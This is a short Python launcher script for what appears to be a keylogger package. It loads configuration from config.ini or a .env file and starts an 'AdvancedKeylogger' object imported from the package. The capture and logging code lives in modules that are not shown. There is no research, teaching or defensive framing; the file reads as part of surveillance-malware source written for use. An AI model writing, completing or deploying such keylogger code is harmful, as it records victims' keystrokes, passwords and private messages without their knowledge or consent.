import sys
import os
from keylogger.config import Config
from keylogger.core import AdvancedKeylogger

def main():
    # Load config from .env or config.ini
    config_file = 'config.ini' if os.path.exists('config.ini') else None
    config = Config(config_file)

    logger = AdvancedKeylogger(config)
    logger.start()

if __name__ == "__main__":
    main()